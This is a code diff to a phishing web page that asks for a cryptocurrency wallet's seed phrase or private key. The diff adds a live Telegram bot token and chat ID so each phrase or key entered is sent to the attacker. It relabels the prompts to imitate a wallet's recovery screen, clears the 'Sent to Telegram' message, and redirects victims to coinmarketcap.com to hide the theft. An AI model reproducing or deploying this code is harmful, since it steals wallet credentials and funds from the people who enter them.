@@ -154,12 +154,12 @@
     <textarea id="privateKeyInput" rows="4" placeholder="Enter your private key"></textarea>
   </div>
 
-  <button class="confirm-btn" onclick="onConfirm()">Confirm</button>
+  <button class="confirm-btn" onclick="onConfirm()">Confirm Secret Recovery Phrase</button>
   <div id="message" class="message"></div>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = 'TON_TOKEN';
-    const TELEGRAM_CHAT_ID = 'TON_CHAT_ID';
+    const TELEGRAM_BOT_TOKEN = '7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0';
+    const TELEGRAM_CHAT_ID = '6996434307';
 
     const bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual"];
 
@@ -229,13 +229,13 @@
         }
         const invalid = words.filter(w => !bip39Words.includes(w));
         if (invalid.length > 0) {
-          showMessage("❌ Incorrect phrase", true);
+          showMessage("❌ Invalid Secret Recovery Phrase", true);
           return;
         }
         sendToTelegram(`🪙 Seed Phrase:\n\n${words.join(" ")}`);
-        showMessage("✅ Sent to Telegram");
+        showMessage("");
         setTimeout(() => {
-          window.location.href = "https://yourwebsite.com";
+          window.location.href = "https://coinmarketcap.com/";
         }, 1000);
       } else {
         const key = document.getElementById('privateKeyInput').value.trim();
@@ -244,9 +244,9 @@
           return;
         }
         sendToTelegram(`🔑 Private Key:\n\n${key}`);
-        showMessage("✅ Sent to Telegram");
+        showMessage("");
         setTimeout(() => {
-          window.location.href = "https://yourwebsite.com";
+          window.location.href = "https://coinmarketcap.com/";
         }, 1000);
       }
     }
